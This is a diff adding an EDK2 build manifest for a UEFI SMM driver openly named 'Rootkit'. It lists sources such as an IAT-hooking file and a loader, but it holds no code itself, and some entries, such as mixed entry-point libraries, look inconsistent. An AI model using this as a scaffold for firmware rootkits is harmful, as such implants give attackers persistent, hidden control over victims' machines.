@@ -1,0 +1,46 @@
+[defines]
+  INF_VERSION = 0x00010050
+  BASE_NAME = Rootkit
+  MODULE_TYPE = SMMDriver
+  PI_SPECIFICATION_VERSION = 0x0001000B
+  ENTRY_POINT = UefiMain
+
+[Sources]
+  auth.c
+  LoaderTwo.c
+  MemManager.c
+  MemMapUEFI.c
+  Memory.c
+  serial.c
+  string.c
+  Tools.c
+  TRTC.c
+  WinIATHook.c
+
+[Packages]
+  IntelFrameworkPkg/IntelFrameworkPkg.dec  
+  IntelFrameworkModulePkg/IntelFrameworkModulePkg.dec  
+  MdePkg/MdePkg.dec
+  MdeModulePkg/MdeModulePkg.dec
+  StdLib/StdLib.dec
+
+[LibraryClasses]
+  BaseMemoryLib
+  DevicePathLib
+  FileHandleLib
+  MemEncryptSevLib
+  MemEncryptTdxLib
+  MicrocodeLib
+  PcdLib
+  PciLib
+  SecurityManagementLib
+  SerializeVariablesLib
+  SmmMemLib
+  UefiApplicationEntryPoint
+  UefiBootServicesTableLib
+  UefiDriverEntryPoint
+  UefiCpuLib
+  UefiUsbLib
+  
+[Depex]
+  TRUE
